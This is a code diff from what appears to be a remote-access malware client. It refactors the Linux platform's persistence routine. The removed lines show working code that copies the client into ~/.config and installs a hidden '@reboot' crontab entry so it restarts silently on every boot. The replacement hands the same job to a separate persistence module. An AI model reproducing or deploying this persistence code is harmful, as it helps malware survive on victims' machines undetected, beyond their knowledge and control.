@@ -1,7 +1,4 @@
 import os
-import subprocess
-import shutil
-import sys
 
 from client.platform.base import AbstractPlatform
 
@@ -41,31 +38,8 @@ class LinuxPlatform(AbstractPlatform):
         return 'ifconfig'
 
     def install_persistence(self, reg_name, copy_name):
-        try:
-            dest_dir = os.path.expanduser(f'~/.config')
-            os.makedirs(dest_dir, exist_ok=True)
-            client_path = os.path.join(dest_dir, copy_name)
-
-            if getattr(sys, 'frozen', False):
-                shutil.copyfile(sys.executable, client_path)
-                os.chmod(client_path, 0o755)
-                cron_cmd = f'{client_path}'
-            else:
-                script_path = os.path.abspath(sys.argv[0])
-                if os.path.isdir(script_path):
-                    script_path = os.path.join(script_path, '__main__.py')
-                shutil.copyfile(script_path, client_path)
-                cron_cmd = f'{sys.executable} {client_path}'
-
-            cron_line = f'@reboot {cron_cmd} >/dev/null 2>&1\n'
-            cron_path = os.path.join(dest_dir, 'crontab_entry')
-            with open(cron_path, 'w') as f:
-                f.write(cron_line)
-            subprocess.call(f'crontab {cron_path}', shell=True)
-            os.remove(cron_path)
-            return '[+] Created persistence via crontab'
-        except Exception as e:
-            return f'[-] Persistence error: {e}'
+        from client.modules.persist import install_persistence
+        return install_persistence('crontab', payload_name=copy_name)
 
     def get_appdata_path(self):
         return os.path.expanduser('~/.config')
